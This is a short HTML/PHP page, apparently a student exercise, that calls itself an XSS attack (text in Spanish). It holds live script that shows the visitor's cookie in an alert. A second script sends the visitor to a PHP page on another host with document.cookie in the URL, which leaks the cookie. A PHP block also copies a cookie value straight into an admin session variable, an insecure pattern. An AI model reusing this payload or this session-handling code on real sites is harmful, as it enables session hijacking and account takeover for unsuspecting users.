<html>

<script>



</script>

<body>

<h1>hola</h1>
<p>Esto es un ataque XSS</p>

<ul>

<ol>el primer alert nos da la cookie del usuario</ol>
<ol>el segundo alert no lleva al archivo xss.php</ol>
</ul>


<?php
session_start();
$cok = $_COOKIE['cookie'];
$_SESSION['admin'] = $cok;

?>


<script>javascript:alert(document.cookie);</script>

<a href=""><script>javascript:window.location='http://172.16.6.150/htdocs/session/ataqueXSS/xss.php?cookie='+document.cookie;</script></a>

</body></html>
